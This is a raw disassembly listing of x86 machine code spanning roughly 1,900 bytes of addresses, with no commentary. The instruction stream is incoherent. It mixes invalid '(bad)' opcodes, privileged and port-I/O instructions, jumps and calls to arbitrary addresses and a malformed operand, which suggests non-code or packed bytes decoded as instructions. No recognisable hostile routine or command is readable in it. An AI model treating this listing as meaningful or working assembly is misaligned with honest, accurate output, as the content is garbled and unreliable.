  499f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499f61:	test   al,0x78
  499f63:	add    esi,DWORD PTR [edi]
  499f65:	adc    dl,BYTE PTR [esi-0x7bf21759]
  499f6b:	ss pop edi
  499f6d:	xchg   esi,eax
  499f6e:	mov    ebp,edx
  499f70:	adc    al,0x82
  499f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499f73:	das    
  499f74:	add    DWORD PTR [esi+0x50],0xa74247cc
  499f7b:	(bad)  
  499f7c:	loop   0x499f99
  499f7e:	sub    bl,BYTE PTR [edx-0x59]
  499f81:	cmp    DWORD PTR [edi+0x1d314143],esi
  499f87:	adc    edi,0x1f
  499f8a:	cmp    BYTE PTR [edi+0x1b80d8b7],ah
  499f90:	adc    ebp,DWORD PTR [edi-0x5e]
  499f93:	push   es
  499f94:	inc    ebp
  499f95:	aaa    
  499f96:	push   0xffffffe7
  499f98:	or     ah,BYTE PTR [edi-0x753e978c]
  499f9e:	daa    
  499f9f:	inc    DWORD PTR [edi+0x28]
  499fa2:	inc    eax
  499fa3:	pop    esp
  499fa4:	arpl   WORD PTR [edi],cx
  499fa6:	iret   
  499fa7:	inc    esp
  499fa8:	add    eax,DWORD PTR [ebp-0x58691826]
  499fae:	fisubr DWORD PTR [edx]
  499fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  499fb1:	adc    bh,bh
  499fb3:	aaa    
  499fb4:	lods   eax,DWORD PTR ds:[esi]
  499fb5:	sub    cl,BYTE PTR [esi]
  499fb7:	mov    cl,0x23
  499fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499fba:	mov    ds:0x47241768,al
  499fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499fc0:	push   es
  499fc1:	add    al,0xa2
  499fc3:	adc    eax,0x56c4bc4f
  499fc8:	and    edx,DWORD PTR [edi]
  499fca:	out    0x23,eax
  499fcc:	outs   dx,BYTE PTR ds:[esi]
  499fcd:	lods   al,BYTE PTR ds:[esi]
  499fce:	xchg   edx,eax
  499fcf:	add    ecx,DWORD PTR [esi+0x35]
  499fd2:	(bad)  
  499fd4:	test   BYTE PTR [eax],dl
  499fd6:	shl    DWORD PTR [edi-0x1f25ba91],1
  499fdc:	push   esi
  499fdd:	sbb    eax,0xc8cf6f9f
  499fe2:	inc    eax
  499fe3:	pop    eax
  499fe4:	aad    0x97
  499fe6:	shl    DWORD PTR [eax-0x78553f6b],cl
  499fec:	call   DWORD PTR [eax]
  499fee:	push   ecx
  499fef:	sub    BYTE PTR [eax],dh
  499ff1:	pop    ds
  499ff2:	daa    
  499ff3:	pop    ss
  499ff4:	leave  
  499ff5:	shr    DWORD PTR [esi],0x76
  499ff8:	pop    edi
  499ff9:	xor    al,0x43
  499ffb:	xchg   ebp,eax
  499ffc:	mov    eax,0x31ff229a
  49a001:	xchg   edi,eax
  49a002:	rol    esp,cl
  49a004:	xor    al,0x56
  49a006:	add    eax,DWORD PTR [edi+ecx*1-0x2f]
  49a00a:	scas   al,BYTE PTR es:[edi]
  49a00b:	mov    esp,esp
  49a00d:	cmp    DWORD PTR [eax],edi
  49a00f:	aaa    
  49a010:	daa    
  49a011:	outs   dx,BYTE PTR ds:[esi]
  49a012:	shl    DWORD PTR ds:0x2e3f4204,0x63
  49a019:	mov    ah,0x9d
  49a01b:	mov    ah,0x3f
  49a01d:	das    
  49a01e:	das    
  49a01f:	dec    esp
  49a020:	xor    eax,0x383f7b5d
  49a025:	aaa    
  49a026:	sub    eax,0x6f8a83ae
  49a02b:	aaa    
  49a02c:	aas    
  49a02d:	imul   ecx,DWORD PTR [ecx+0x47],0x39fe97a0
  49a034:	push   esi
  49a035:	dec    ecx
  49a036:	inc    esp
  49a037:	mov    bh,BYTE PTR [edi]
  49a039:	wrmsr  
  49a03b:	adc    ah,BYTE PTR [ecx+0x5a7f3f98]
  49a041:	sbb    edx,DWORD PTR [ecx]
  49a043:	push   0xaa1cf3f
  49a048:	sbb    al,0xac
  49a04a:	jmp    DWORD PTR [edi]
  49a04c:	outs   dx,DWORD PTR ds:[esi]
  49a04d:	adc    dl,dh
  49a04f:	push   0x4a56bf11
  49a054:	scas   al,BYTE PTR es:[edi]
  49a055:	adc    DWORD PTR [edi+0x15620b30],ebx
  49a05b:	rcr    BYTE PTR [edi+0x56a7aa9e],cl
  49a061:	add    eax,0xb54fc627
  49a066:	or     ah,al
  49a068:	or     BYTE PTR [edx-0x39],al
  49a06b:	and    eax,0x3f30685a
  49a070:	outs   dx,DWORD PTR ds:[esi]
  49a071:	xchg   esp,eax
  49a072:	push   cs
  49a073:	retf   0x121a
  49a076:	aaa    
  49a077:	leave  
  49a078:	cmp    DWORD PTR [ecx+edx*2],0x34003627
  49a07f:	xor    esp,DWORD PTR [ebx+0x36]
  49a082:	add    BYTE PTR ds:0x18b60e47,0xb5
  49a089:	xor    esp,edi
  49a08b:	into   
  49a08c:	out    0x35,eax
  49a08e:	lods   eax,DWORD PTR ds:[esi]
  49a08f:	add    DWORD PTR [ecx-0x1c1721b8],esi
  49a095:	imul   eax,eax,0x37
  49a098:	aas    
  49a099:	jecxz  0x49a0c6
  49a09b:	test   al,0x51
  49a09d:	aad    0xa
  49a09f:	push   edi
  49a0a0:	xchg   edi,eax
  49a0a1:	inc    esp
  49a0a2:	(bad)  
  49a0a3:	push   cs
  49a0a4:	adc    BYTE PTR [edi-0x2f974b81],ch
  49a0aa:	mov    BYTE PTR [edi],ah
  49a0ac:	daa    
  49a0ad:	mov    DWORD PTR [edx],ebp
  49a0af:	jne    0x49a101
  49a0b1:	xlat   BYTE PTR ds:[ebx]
  49a0b2:	xlat   BYTE PTR ss:[ebx]
  49a0b4:	ror    DWORD PTR [edx],cl
  49a0b6:	ror    DWORD PTR [ebx],0x46
  49a0b9:	(bad)  
  49a0ba:	imul   esi,DWORD PTR ds:0x727556a,0xffffffaa
  49a0c1:	call   0x31590600
  49a0c6:	div    DWORD PTR [esp+ebp*8+0x7a]
  49a0ca:	rol    bh,1
  49a0cc:	pop    ss
  49a0cd:	pop    edi
  49a0ce:	mov    edx,0x775858b0
  49a0d3:	jg     0x49a0af
  49a0d5:	and    ch,dl
  49a0d7:	mov    eax,0x8fb6ff41
  49a0dc:	int    0xd8
  49a0de:	add    BYTE PTR [edi+esi*1+0x31e3f2b7],cl
  49a0e5:	push   esi
  49a0e6:	inc    edi
  49a0e7:	inc    edx
  49a0e8:	mov    edi,0x31561041
  49a0ed:	push   esi
  49a0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a0ef:	sbb    BYTE PTR [eax],ah
  49a0f1:	mov    ah,0x55
  49a0f3:	scas   eax,DWORD PTR es:[edi]
  49a0f4:	(bad)  
  49a0f5:	push   edx
  49a0f6:	push   es
  49a0f7:	mov    ds:0x47470d82,eax
  49a0fc:	shl    BYTE PTR [eax+0x3798234b],cl
  49a102:	call   FWORD PTR [eax-0x406eaa7c]
  49a108:	jg     0x49a0e0
  49a10a:	sub    BYTE PTR [ecx+edi*1],ch
  49a10d:	xor    edi,eax
  49a10f:	and    DWORD PTR es:[ecx+edx*4-0x19],eax
  49a114:	pop    ds
  49a115:	inc    ecx
  49a116:	jo     0x49a121
  49a118:	or     ebx,DWORD PTR [edi]
  49a11a:	adc    eax,0xaf862682
  49a11f:	inc    esi
  49a120:	outs   dx,DWORD PTR ds:[esi]
  49a121:	sbb    dl,al
  49a123:	add    al,0xb
  49a125:	outs   dx,DWORD PTR ds:[esi]
  49a126:	ss ins DWORD PTR es:[edi],dx
  49a128:	push   ss
  49a129:	mov    BYTE PTR [edi+edx*8+0x4f],dl
  49a12d:	cs loope 0x49a0b8
  49a130:	call   0x6f7da05c
  49a135:	and    DWORD PTR [eax],edx
  49a137:	inc    ebp
  49a138:	sub    BYTE PTR [edi],dl
  49a13a:	nop
  49a13b:	retf   
  49a13c:	add    al,0xa1
  49a13e:	fistp  QWORD PTR [edi]
  49a140:	xor    al,0x31
  49a142:	adc    al,0x82
  49a144:	popa   
  49a145:	cmp    DWORD PTR ds:0x20d9766f,esi
  49a14b:	mov    ah,0x87
  49a14d:	push   ebx
  49a14e:	mov    ds,WORD PTR [edi]
  49a150:	leave  
  49a151:	leave  
  49a152:	leave  
  49a153:	in     eax,0x41
  49a155:	inc    ecx
  49a156:	inc    ebp
  49a157:	inc    ebp
  49a158:	jecxz  0x49a0ee
  49a15a:	or     ecx,0xb165737
  49a160:	sub    BYTE PTR [esi+0x1f],ah
  49a163:	xor    BYTE PTR [edi],dl
  49a165:	iret   
  49a166:	and    DWORD PTR [esi+0x61],eax
  49a169:	adc    eax,0xabb14f17
  49a16e:	xchg   edx,eax
  49a16f:	push   ds
  49a170:	pop    ss
  49a171:	xor    DWORD PTR ss:[edi+0x61282ac0],ebx
  49a178:	fbld   TBYTE PTR [eax+0x2e]
  49a17b:	data16 or BYTE PTR [edi],al
  49a17e:	inc    ecx
  49a17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49a180:	cdq    
  49a181:	adc    dl,BYTE PTR [esi-0x59]
  49a184:	(bad)  
  49a185:	cmp    DWORD PTR [eax-0x80],ebx
  49a188:	and    ecx,DWORD PTR [eax]
  49a18a:	(bad)  
  49a18b:	cmp    edi,eax
  49a18d:	sbb    edx,DWORD PTR [esi]
  49a18f:	test   al,ah
  49a191:	das    
  49a192:	pop    es
  49a193:	out    0xdd,eax
  49a195:	fs mov dh,0x90
  49a198:	xor    DWORD PTR [edi],ebx
  49a19a:	inc    esp
  49a19b:	outs   dx,BYTE PTR ds:[esi]
  49a19c:	inc    edi
  49a19d:	jno    0x49a211
  49a19f:	repnz pop ds
  49a1a1:	inc    ebx
  49a1a2:	ss inc edx
  49a1a4:	xor    bh,BYTE PTR [bp+di+0x4390]
  49a1a9:	cs inc ecx
  49a1ab:	xor    dh,BYTE PTR [ebx]
  49a1ad:	jg     0x49a14f
  49a1af:	ss xor esp,esp
  49a1b2:	ss out 0x58,eax
  49a1b5:	and    BYTE PTR [ebx],al
  49a1b7:	ret    
  49a1b8:	xor    DWORD PTR [bx+si-0x66f5],edx
  49a1bd:	loopne 0x49a226
  49a1bf:	ss ss mov ss,esi
  49a1c3:	popa   
  49a1c4:	xor    al,0x4b
  49a1c6:	addr16 xchg ebx,eax
  49a1c8:	push   eax
  49a1c9:	rcl    DWORD PTR [eax+0x2f31e739],cl
  49a1cf:	pusha  
  49a1d0:	push   ebp
  49a1d1:	shl    BYTE PTR [ebx],cl
  49a1d3:	xor    DWORD PTR [bp+si-0x5e],edx
  49a1d7:	lods   eax,DWORD PTR ds:[esi]
  49a1d8:	mov    dh,0x7
  49a1da:	(bad)  
  49a1db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a1dc:	xchg   BYTE PTR [eax],al
  49a1de:	add    DWORD PTR [ebx-0x41],0x47
  49a1e2:	cmp    bl,dl
  49a1e4:	jnp    0x49a172
  49a1e6:	inc    eax
  49a1e7:	data16 arpl WORD PTR [edi],bp
  49a1ea:	adc    eax,0xc75b11c9
  49a1ef:	cmp    BYTE PTR [eax],dl
  49a1f1:	sub    BYTE PTR [eax-0x7f],0x9a
  49a1f5:	das    
  49a1f6:	pop    eax
  49a1f7:	jne    0x49a20d
  49a1f9:	pop    ebx
  49a1fa:	pop    es
  49a1fb:	(bad)  
  49a1fc:	cmp    bh,al
  49a1fe:	lods   al,BYTE PTR ds:[esi]
  49a1ff:	xchg   BYTE PTR [ebp+0xc],al
  49a202:	daa    
  49a203:	(bad)  
  49a204:	xor    BYTE PTR [ebp+edx*2-0x2a7648a0],cl
  49a20b:	dec    eax
  49a20c:	lods   al,BYTE PTR ds:[esi]
  49a20d:	imul   esi,edi,0x47
  49a210:	push   eax
  49a211:	lods   al,BYTE PTR ds:[esi]
  49a212:	call   0x2462:0x6438fe7
  49a219:	and    bh,BYTE PTR [edi+0x35]
  49a21c:	inc    ecx
  49a21d:	push   0x2737a348
  49a222:	outs   dx,BYTE PTR ds:[esi]
  49a223:	dec    edx
  49a224:	add    al,0xa
  49a226:	xor    BYTE PTR [edi+0x26815bb7],0xe4
  49a22d:	ss inc esi
  49a22f:	(bad)  
  49a230:	xlat   BYTE PTR ds:[ebx]
  49a231:	fisttp DWORD PTR [ebp+0x14]
  49a234:	push   ss
  49a235:	dec    edi
  49a236:	aaa    
  49a237:	dec    edi
  49a238:	inc    esi
  49a239:	and    dl,BYTE PTR [esp+ecx*1]
  49a23c:	dec    edi
  49a23d:	jg     0x49a2a5
  49a23f:	loop   0x49a28d
  49a241:	lods   al,BYTE PTR ds:[esi]
  49a242:	push   es
  49a243:	jmp    FWORD PTR [edx+0x54]
  49a246:	adc    dh,BYTE PTR [ecx]
  49a248:	xchg   DWORD PTR [edx+0x11],ebp
  49a24b:	fmul   QWORD PTR [ecx]
  49a24d:	scas   eax,DWORD PTR es:[edi]
  49a24e:	inc    ebx
  49a24f:	cmove  ebp,DWORD PTR [eax-0x28]
  49a253:	pusha  
  49a254:	daa    
  49a255:	pop    ds
  49a256:	pop    ebx
  49a257:	add    eax,DWORD PTR [esi+0x1f36ff23]
  49a25d:	push   eax
  49a25e:	pop    ss
  49a25f:	push   esp
  49a260:	jp     0x49a208
  49a262:	div    DWORD PTR [edx]
  49a264:	inc    edx
  49a265:	mov    cl,0x65
  49a267:	lods   al,BYTE PTR ds:[esi]
  49a268:	(bad)  
  49a26a:	fisttp DWORD PTR [eax-0x1100dc29]
  49a270:	iret   
  49a271:	mul    DWORD PTR [esp+ebp*1]
  49a274:	es inc esi
  49a276:	(bad)  
  49a277:	dec    ebp
  49a278:	dec    ebp
  49a279:	sbb    esp,DWORD PTR [edi]
  49a27b:	xchg   edi,eax
  49a27c:	jg     0x49a2c0
  49a27e:	xchg   edx,eax
  49a27f:	icebp  
  49a280:	nop
  49a281:	test   al,0xbf
  49a283:	out    0x20,eax
  49a285:	adc    al,0x20
  49a287:	popf   
  49a288:	dec    edi
  49a289:	inc    edi
  49a28a:	adc    eax,0x337dab02
  49a28f:	iret   
  49a290:	(bad)  
  49a291:	in     eax,dx
  49a292:	push   ecx
  49a293:	sub    esi,DWORD PTR [esi]
  49a295:	ss push edi
  49a297:	xchg   ebx,eax
  49a298:	push   edi
  49a299:	test   al,0x85
  49a29b:	adc    eax,0x88273332
  49a2a0:	push   ds
  49a2a1:	test   BYTE PTR [ebx+0x21373735],ch
  49a2a7:	mov    dh,0xba
  49a2a9:	push   cs
  49a2aa:	ss daa 
  49a2ac:	test   DWORD PTR [edx+eax*8],0xc7ff1826
  49a2b3:	repnz push 0xe6d756e1
  49a2b9:	aaa    
  49a2ba:	xor    DWORD PTR [edx+0x55],esp
  49a2bd:	pop    eax
  49a2be:	adc    BYTE PTR [edi+0x50],dh
  49a2c1:	mov    ah,0x40
  49a2c3:	xchg   BYTE PTR [edi+0x45],ah
  49a2c6:	data16 sbb BYTE PTR [bx+si+0x353c],al
  49a2cc:	add    BYTE PTR [edx],dh
  49a2ce:	sub    eax,DWORD PTR [esi-0x7e]
  49a2d1:	adc    DWORD PTR ds:0x7671714,ebp
  49a2d7:	jmp    0xf00cb4a2
  49a2dc:	xor    al,0x37
  49a2de:	shl    BYTE PTR [eax],1
  49a2e0:	push   esp
  49a2e1:	push   0xeaefc69f
  49a2e6:	retf   0xc958
  49a2e9:	inc    ecx
  49a2ea:	ret    
  49a2eb:	xor    DWORD PTR [ecx+0x341f31c6],edx
  49a2f1:	pop    edi
  49a2f2:	jb     0x49a2cb
  49a2f4:	adc    eax,0x27421f2b
  49a2f9:	inc    esi
  49a2fa:	shl    DWORD PTR ds:0x3f4e1558,1
  49a300:	mov    bh,0x40
  49a302:	mov    DWORD PTR [esi+0x4d65f7f],eax
  49a308:	lods   al,BYTE PTR ds:[esi]
  49a309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a30a:	dec    ecx
  49a30b:	xor    ch,BYTE PTR cs:[edi+edx*1]
  49a30f:	pop    ebx
  49a310:	mov    bh,0xbf
  49a312:	das    
  49a313:	inc    ebp
  49a314:	mov    ch,0x60
  49a316:	inc    esp
  49a317:	or     eax,0xd6a40747
  49a31c:	in     al,0x56
  49a31e:	xchg   edi,eax
  49a31f:	rcl    DWORD PTR [edi-0x121b4af4],cl
  49a325:	jnp    0x49a34d
  49a327:	cmp    dh,bl
  49a329:	inc    ebp
  49a32a:	mov    dl,0x42
  49a32c:	je     0x49a3ad
  49a32e:	pop    ss
  49a32f:	test   BYTE PTR [esi+0x707a8c5],cl
  49a335:	stos   DWORD PTR es:[edi],eax
  49a336:	cmp    ah,al
  49a338:	cmp    BYTE PTR [edx+0x7],dl
  49a33b:	xor    eax,0x2e3aacef
  49a340:	add    BYTE PTR [ebx+0x2f],0x42
  49a344:	das    
  49a345:	dec    ebp
  49a346:	or     DWORD PTR [esi+0x44],eax
  49a349:	call   edi
  49a34b:	das    
  49a34c:	jne    0x49a35b
  49a34e:	mov    ch,BYTE PTR [ecx-0x9]
  49a351:	neg    DWORD PTR [edx+0x5f081d56]
  49a357:	div    BYTE PTR [ecx]
  49a359:	jle    0x49a3d7
  49a35b:	mov    WORD PTR [eax+0x7b],es
  49a35e:	xor    al,BYTE PTR ds:0x408d
  49a363:	adc    edi,DWORD PTR [edi-0x50]
  49a366:	push   cs
  49a367:	sbb    ebp,ebx
  49a369:	iret   
  49a36a:	jg     0x49a3d8
  49a36c:	bound  edx,QWORD PTR ds:0xed8aafa5
  49a372:	test   al,0x78
  49a374:	pop    ss
  49a375:	inc    ebp
  49a376:	outs   dx,DWORD PTR ds:[esi]
  49a377:	ss aaa 
  49a379:	outs   dx,DWORD PTR ds:[esi]
  49a37a:	inc    edi
  49a37b:	mov    ah,0xea
  49a37d:	rcr    BYTE PTR [edi-0x59],0x35
  49a381:	mov    cl,0x52
  49a383:	push   edi
  49a384:	add    al,0x6f
  49a386:	inc    ecx
  49a387:	inc    DWORD PTR [ecx]
  49a389:	or     edx,DWORD PTR [esi]
  49a38b:	inc    ecx
  49a38c:	outs   dx,DWORD PTR ds:[esi]
  49a38d:	pop    es
  49a38e:	pop    ds
  49a38f:	cmp    al,BYTE PTR [edx+eax*4-0x2914f1d9]
  49a396:	mov    al,ds:0xa72701ea
  49a39b:	or     eax,0xbf018b47
  49a3a0:	xlat   BYTE PTR ds:[ebx]
  49a3a1:	scas   eax,DWORD PTR es:[edi]
  49a3a2:	outs   dx,DWORD PTR ds:[esi]
  49a3a3:	aad    0x80
  49a3a5:	pop    ebx
  49a3a6:	(bad)  
  49a3a7:	daa    
  49a3a8:	push   edi
  49a3a9:	adc    BYTE PTR [ebx+0x2a],dl
  49a3ac:	xor    DWORD PTR [edi+ebp*2],0x62710577
  49a3b3:	leave  
  49a3b4:	inc    ebx
  49a3b5:	lahf   
  49a3b6:	imul   eax,DWORD PTR [ecx+0x20],0xc707af8e
  49a3bd:	add    ah,ah
  49a3bf:	sbb    BYTE PTR [edi],0x41
  49a3c2:	jmp    ecx
  49a3c4:	and    bh,cl
  49a3c6:	xor    al,0x35
  49a3c8:	pop    ds
  49a3c9:	aaa    
  49a3ca:	xor    edx,DWORD PTR [esp+esi*4+0x3a]
  49a3ce:	mov    cl,0x83
  49a3d0:	lahf   
  49a3d1:	test   esp,0xe23c501
  49a3d7:	inc    edi
  49a3d8:	xor    cl,BYTE PTR [edx]
  49a3da:	in     al,0x11
  49a3dc:	sub    DWORD PTR [edi+0x5612397e],ebp
  49a3e2:	mov    DWORD PTR [edi-0x11],0x288101f
  49a3e9:	sub    al,0xef
  49a3eb:	addr16 enter 0x5c44,0x58
  49a3f0:	pop    es
  49a3f1:	pop    edi
  49a3f2:	xor    al,0x74
  49a3f4:	mov    eax,esp
  49a3f6:	add    BYTE PTR ds:0xa2312467,dh
  49a3fc:	mov    eax,0x116047ea
  49a401:	arpl   bp,ax
  49a403:	pop    edi
  49a404:	pop    ss
  49a405:	inc    edx
  49a406:	sbb    BYTE PTR [eax],ch
  49a408:	(bad)  
  49a409:	and    dl,BYTE PTR [edi-0x4ea5e0cb]
  49a40f:	test   eax,0x635744ff
  49a414:	push   cs
  49a415:	mov    cl,BYTE PTR [ebp+0x69]
  49a418:	push   edi
  49a419:	aaa    
  49a41a:	pop    ss
  49a41b:	xor    ah,cl
  49a41d:	push   0x7f4706eb
  49a422:	inc    edx
  49a423:	or     esi,ecx
  49a425:	inc    edx
  49a426:	adc    al,0x57
  49a428:	jg     0x49a409
  49a42a:	stos   BYTE PTR es:[edi],al
  49a42b:	lea    esi,[ebp+0x1f7f070d]
  49a431:	rol    BYTE PTR [edx],0xae
  49a434:	adc    eax,0x32593202
  49a439:	push   edx
  49a43a:	adc    bh,bh
  49a43c:	sbb    edx,DWORD PTR [ecx-0x4b]
  49a43f:	mov    dh,0x6f
  49a441:	add    esi,DWORD PTR [edi]
  49a443:	mov    edi,0x14c213ac
  49a448:	xor    ch,BYTE PTR [edi]
  49a44a:	push   edx
  49a44b:	test   al,0xa0
  49a44d:	add    eax,0x8219dff
  49a452:	pop    esi
  49a453:	outs   dx,BYTE PTR ds:[esi]
  49a454:	pop    edi
  49a455:	inc    esp
  49a456:	pop    ebx
  49a457:	jb     0x49a475
  49a459:	stos   DWORD PTR es:[edi],eax
  49a45a:	retf   
  49a45b:	pop    ds
  49a45c:	xor    dh,BYTE PTR [ebx]
  49a45e:	adc    esp,ebp
  49a460:	xchg   edx,eax
  49a461:	ret    0xbf97
  49a464:	sbb    bl,BYTE PTR ds:0x8f43ce12
  49a46a:	push   ss
  49a46b:	shr    BYTE PTR [ebp+0x3737e741],1
  49a471:	aam    0x16
  49a473:	mov    al,ds:0x4abf9793
  49a478:	or     DWORD PTR [ecx-0x47302c40],ecx
  49a47e:	es pop eax
  49a480:	rcr    BYTE PTR [edi],0x34
  49a483:	inc    esp
  49a484:	sub    BYTE PTR ds:0x83ef5f22,ch
  49a48a:	sbb    al,cl
  49a48c:	ja     0x49a4c1
  49a48e:	mov    edi,0x10304544
  49a493:	ret    
  49a494:	add    bl,bh
  49a496:	inc    ebx
  49a497:	pop    edi
  49a498:	cdq    
  49a499:	push   ss
  49a49a:	nop
  49a49b:	fdiv   DWORD PTR [eax]
  49a49d:	lahf   
  49a49e:	dec    eax
  49a49f:	inc    edi
  49a4a0:	and    BYTE PTR [esi+eiz*4-0x1d53c0ca],0x0
  49a4a8:	test   eax,0x417f5bff
  49a4ad:	add    al,0xbf
  49a4af:	sub    eax,0xf25f320b
  49a4b4:	pop    ebp
  49a4b5:	pop    es
  49a4b6:	sub    DWORD PTR [edi],0xfb37bf43
  49a4bc:	shl    BYTE PTR [ecx],0x17
  49a4bf:	xor    al,BYTE PTR [ebp-0x7d]
  49a4c2:	mov    edi,0x1162ac1e
  49a4c7:	aas    
  49a4c8:	pop    edi
  49a4c9:	cmp    BYTE PTR [ebx+0x4f40c08b],cl
  49a4cf:	retf   0x22d0
  49a4d2:	mov    ?,WORD PTR [esi]
  49a4d4:	inc    DWORD PTR [edi]
  49a4d6:	shl    BYTE PTR [eax+0x50],cl
  49a4d9:	daa    
  49a4da:	pop    edi
  49a4db:	xor    eax,0x11a0aa34
  49a4e0:	enter  0x4200,0x5f
  49a4e4:	adc    DWORD PTR [ebx+0x14],edi
  49a4e7:	xor    BYTE PTR [ebx+0x50360203],ch
  49a4ed:	or     BYTE PTR [edi],bh
  49a4ef:	sub    eax,0xbfc37560
  49a4f4:	rol    BYTE PTR [edx],cl
  49a4f6:	push   esi
  49a4f7:	and    edi,DWORD PTR [edi+0x740582c0]
  49a4fd:	mov    edi,0x46ac0507
  49a502:	pop    edx
  49a503:	mov    edi,0xa4e2a94c
  49a508:	mov    edi,0xb48d52f
  49a50d:	dec    eax
  49a50e:	mov    edi,0x80b49d01
  49a513:	mov    edi,0x6aa0405a
  49a518:	aaa    
  49a519:	cmp    BYTE PTR [eax+0x5fbf4e80],dh
  49a51f:	call   0xbff5aac8
  49a524:	mov    ah,0x80
  49a526:	add    eax,0xb49070b
  49a52b:	pop    eax
  49a52c:	lea    edi,[edi-0x2fbd44ff]
  49a532:	mov    edi,0x1ab0163f
  49a537:	imul   edi,DWORD PTR [edi-0x6c5f7a8c],0x2d23fbf
  49a541:	(bad)  
  49a542:	xor    BYTE PTR [ebx],dh
  49a544:	pop    ds
  49a545:	rol    BYTE PTR [edx+0x7bf7405],0x5
  49a54c:	lods   al,BYTE PTR ds:[esi]
  49a54d:	inc    esi
  49a54e:	pop    edx
  49a54f:	mov    edi,0xa4e82105
  49a554:	mov    edi,0xb48d5807
  49a559:	cmp    BYTE PTR [edi+0xb49d042],0xbf
  49a560:	and    ebp,DWORD PTR ds:0xbf671160
  49a566:	je     0x49a53a
  49a568:	add    dl,BYTE PTR [esi-0x41]
  49a56b:	mov    dh,0xd5
  49a56d:	mov    DWORD PTR ds:0x74107f9f,eax
  49a573:	rol    BYTE PTR [edx],cl
  49a575:	mov    edi,0x82c05a46
  49a57a:	pop    es
  49a57b:	mov    edi,0xac05a4e8
  49a580:	mov    edi,0x210580b4
  49a585:	pop    es
  49a586:	dec    ecx
  49a587:	or     ebx,DWORD PTR [eax-0x73]
  49a58a:	mov    edi,0xd0420b01
  49a58f:	mov    edi,0x1ab01607
  49a594:	imul   edi,DWORD PTR [edi-0x6c5f7b8a],0x35601fbf
  49a59e:	rol    BYTE PTR [edx],cl
  49a5a0:	mov    edi,0x2d274108
  49a5a5:	mov    edi,0xec05a46a
  49a5aa:	pop    ds
  49a5ab:	mov    edi,0xc05a4e82
  49a5b0:	mov    edi,0x10580b48
  49a5b5:	pop    es
  49a5b6:	popf   
  49a5b7:	mov    ah,0x80
  49a5b9:	aad    0xbf
  49a5bb:	mov    edi,0x42029d6
  49a5c0:	neg    DWORD PTR [ebp+0x3d580b4]
  49a5c6:	mov    edi,0x23a150
  49a5cb:	pop    ds
  49a5cc:	xchg   ebx,eax
  49a5cd:	push   ss
  49a5ce:	mov    al,0x46
  49a5d0:	stos   DWORD PTR es:[edi],eax
  49a5d1:	add    dl,BYTE PTR [esi]
  49a5d3:	sub    al,0xa0
  49a5d5:	mov    edi,0x35602d07
  49a5da:	sar    BYTE PTR [edi+0x2741082c],cl
  49a5e0:	mov    edi,0xa46ac007
  49a5e5:	add    eax,0x4e8211bf
  49a5ea:	pop    edx
  49a5eb:	mov    edi,0x18b6980b
  49a5f0:	(bad)  
  49a5f1:	pop    edi
  49a5f2:	xor    eax,0x49d0423a
  49a5f7:	mov    edi,0xd602d1f
  49a5fc:	sbb    BYTE PTR [esi],dh
  49a5fe:	(bad)  
  49a5ff:	in     al,dx
  49a600:	dec    eax
  49a601:	inc    eax
  49a602:	daa    
  49a603:	mov    edi,0xa46ac01f
  49a608:	add    eax,0x4e8210bf
  49a60d:	pop    edx
  49a60e:	mov    edi,0x580b48d5
  49a613:	pop    es
  49a614:	mov    edi,0x80b49d04
  49a619:	mov    edi,0x20b01691
  49a61e:	pop    es
  49a61f:	cmp    ch,BYTE PTR [ecx+0x1]
  49a622:	stos   DWORD PTR es:[edi],eax
  49a623:	mov    edi,0x56451abf
  49a628:	or     bh,al
  49a62a:	daa    
  49a62b:	sub    eax,0xbf5f1560
  49a630:	push   edi
  49a631:	push   0xbf2f401a
  49a636:	ror    BYTE PTR [ecx+0xb],1
  49a639:	pop    eax
  49a63a:	mov    edi,0x420b0169
  49a63f:	pop    es
  49a640:	xchg   ebx,eax
  49a641:	push   ss
  49a642:	mov    al,0x1a
  49a644:	mov    edi,0xa0841602
  49a649:	mov    edi,0x35602d07
  49a64e:	sar    BYTE PTR [edi+0x2741081d],cl
  49a654:	mov    edi,0xd580b45f
  49a659:	pop    eax
  49a65a:	lahf   
  49a65b:	sub    DWORD PTR [ecx+0x1],ebp
  49a65e:	popf   
  49a65f:	mov    edi,0x5604083c
  49a664:	lahf   
  49a665:	dec    esi
  49a666:	ss pop es
  49a668:	add    al,0x20
  49a66a:	nop
  49a66b:	add    DWORD PTR [ecx+0x9],0xa
  49a66f:	sbb    BYTE PTR [edi+0x60282306],ch
  49a675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a676:	imul   eax,DWORD PTR [ecx],0xaaef06cf
  49a67c:	dec    eax
  49a67d:	sub    eax,0x75efbf3a
  49a682:	add    al,BYTE PTR [edx]
  49a684:	fdiv   QWORD PTR [edi+0x75bbc67f]
  49a68a:	fild   DWORD PTR [ebx-0x31]
  49a68d:	pop    ss
  49a68e:	xor    al,0x27
  49a690:	inc    ebp
  49a691:	pop    ds
  49a692:	stos   BYTE PTR es:[edi],al
  49a693:	xor    BYTE PTR [ecx],0xb
  49a696:	dec    ebx
  49a697:	pop    edi
  49a698:	ins    DWORD PTR es:[edi],dx
  49a699:	push   edi
  49a69a:	sub    esp,eax
  49a69c:	xchg   edi,edi
  49a69e:	pop    DWORD PTR [eax+0x42dadc11]
  49a6a4:	bound  ebx,QWORD PTR [bx]
  49a6a7:	cmp    dh,BYTE PTR [ebx-0x23]
  49a6aa:	sub    bh,0x39
  49a6ad:	and    cl,dl
  49a6af:	add    BYTE PTR [esi-0x6f],dl
  49a6b2:	(bad)  
  49a6b5:	or     BYTE PTR [edi+edx*1],dl
  49a6b8:	into   
  49a6b9:	xchg   DWORD PTR [ebx],esi
  49a6bb:	pop    es
  49a6bc:	ins    DWORD PTR es:[edi],dx
  49a6bd:	shl    DWORD PTR [edx],0xaf
  49a6c0:	pop    es
  49a6c1:	mov    edi,0xd1086b34
  49a6c6:	es mov edi,0x170da1e1
  49a6cd:	dec    ebx
  49a6ce:	daa    
  49a6cf:	cs loop 0x49a67a
  49a6d2:	mov    dh,0xa
  49a6d4:	iret   
